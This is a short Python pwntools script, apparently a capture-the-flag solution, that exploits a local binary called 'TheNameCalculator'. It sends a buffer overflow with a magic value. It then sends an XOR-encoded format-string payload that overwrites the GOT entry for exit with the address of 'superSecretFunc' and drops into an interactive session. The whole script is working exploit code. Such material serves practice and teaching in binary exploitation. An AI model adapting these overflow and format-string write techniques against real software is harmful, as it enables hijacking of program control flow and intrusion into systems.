from pwn import *
# context.log_level = "debug"
def str2hex(in_str):
	turn_num = len(in_str) - 4 
	result = ""
	for i in range(turn_num): 
		now = u32(in_str[:4])
		now ^= 0x5F7B4153 
		in_str = p32(now)[1:] + in_str[4:]
		result += p32(now)[0]
	result += in_str
	return result

p = process("./TheNameCalculator")
elf = ELF("./TheNameCalculator")
payload1 = "a" * 0x1c + p32(0x6A4B825)
p.sendafter("name?\n" , payload1)

payload2 = str2hex(p32(elf.got["exit"]) + "%" + str(elf.sym["superSecretFunc"] & 0xffff - 4) + "c%12$hn")
p.sendafter("Say that again please\n" , payload2)
p.recvuntil("This is your new name: ")

import time
time.sleep(0.1)
p.recvuntil("Here")
p.interactive()